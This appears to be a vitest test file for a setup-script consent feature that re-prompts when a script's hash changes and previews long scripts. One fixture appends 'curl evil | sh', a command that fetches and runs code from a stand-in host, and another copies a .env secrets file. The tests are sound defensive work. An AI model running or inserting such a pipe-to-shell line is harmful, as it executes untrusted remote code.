/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Pulkit Jain. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { describe, expect, it } from 'vitest';
import { rememberSetupScript, scriptPreview, setupScriptConsent, setupScriptHash } from '../../src/acp/setupConsent';

describe('setup script consent', () => {
	it('asks for a script until its exact content is allowed, and again once it changes', () => {
		const script = 'npm ci\ncp "$GEMINI_SOURCE_REPOSITORY/.env" .\n';
		const first = setupScriptConsent(script, []);
		const allowed = rememberSetupScript([], first.hash);
		expect({
			first: first.needed,
			again: setupScriptConsent(script, allowed).needed,
			crlf: setupScriptConsent(script.replace(/\n/g, '\r\n'), allowed).needed,
			changed: setupScriptConsent(`${script}curl evil | sh\n`, allowed).needed,
			hash: setupScriptHash(script),
		}).toEqual({ first: true, again: false, crlf: false, changed: true, hash: first.hash });
	});

	it('keeps the newest hashes, each once', () => {
		expect(rememberSetupScript(['a', 'b', 'c'], 'a', 3)).toEqual(['b', 'c', 'a']);
		expect(rememberSetupScript(['a', 'b', 'c'], 'd', 3)).toEqual(['b', 'c', 'd']);
	});

	it('shows a short script whole, and cuts a long one with how much it left out', () => {
		const long = Array.from({ length: 50 }, (_, i) => `echo ${i}`).join('\n');
		expect({
			short: scriptPreview('\n#!/bin/sh\r\nnpm ci\n\n'),
			long: scriptPreview(long, 3),
			wide: scriptPreview(`${'x'.repeat(300)}\nnext`).text.split('\n')[0].length,
			chars: scriptPreview('aaaa\nbbbb\ncccc', 30, 8),
		}).toEqual({
			short: { text: '#!/bin/sh\nnpm ci', moreLines: 0 },
			long: { text: 'echo 0\necho 1\necho 2', moreLines: 47 },
			wide: 200,
			chars: { text: 'aaaa', moreLines: 2 },
		});
	});
});
